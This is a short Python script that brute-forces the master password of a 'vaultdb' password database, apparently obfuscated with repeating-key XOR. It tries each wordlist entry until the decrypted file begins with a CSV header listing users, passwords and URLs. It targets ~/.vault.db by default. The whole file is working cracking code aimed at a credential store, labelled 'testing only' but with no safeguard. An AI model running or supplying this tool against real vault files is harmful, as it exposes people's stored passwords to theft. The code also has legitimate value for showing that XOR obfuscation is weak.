#!/usr/bin/env python3
"""
Brute-force helper for vaultdb XOR-obfuscated databases.
For testing only. Provide a wordlist; the script reports the first key that
produces the expected CSV header.
"""

import argparse
import sys
from pathlib import Path


EXPECTED_HEADER = b"id,description,user,password,url,comment,tags,createdate,updatedate,status"


def xor_decrypt(data: bytes, key: bytes) -> bytes:
    if not key:
        return b""
    key_len = len(key)
    return bytes(b ^ key[i % key_len] for i, b in enumerate(data))


def looks_like_vault(data: bytes) -> bool:
    return data.startswith(EXPECTED_HEADER)


def brute_force(db_path: Path, wordlist_path: Path) -> str | None:
    ciphertext = db_path.read_bytes()
    with wordlist_path.open("rb") as wl:
        for idx, line in enumerate(wl, 1):
            candidate = line.rstrip(b"\r\n")
            if not candidate:
                continue
            plain = xor_decrypt(ciphertext, candidate)
            if looks_like_vault(plain):
                return candidate.decode("utf-8", errors="replace")
            if idx % 100000 == 0:
                print(f"Checked {idx} candidates...", file=sys.stderr)
    return None


def main() -> int:
    parser = argparse.ArgumentParser(description="Brute-force vaultdb master password (testing only).")
    parser.add_argument("--db", default="~/.vault.db", help="Path to vault database (default: ~/.vault.db)")
    parser.add_argument("--wordlist", required=True, help="Path to wordlist file (one password per line)")
    args = parser.parse_args()

    db_path = Path(args.db).expanduser()
    wl_path = Path(args.wordlist).expanduser()

    if not db_path.exists():
        print(f"Database not found: {db_path}", file=sys.stderr)
        return 1
    if not wl_path.exists():
        print(f"Wordlist not found: {wl_path}", file=sys.stderr)
        return 1

    print(f"Brute-forcing {db_path} with {wl_path} (testing only)...")
    found = brute_force(db_path, wl_path)
    if found is None:
        print("No matching key found.")
        return 2
    print(f"Possible master password: {found}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
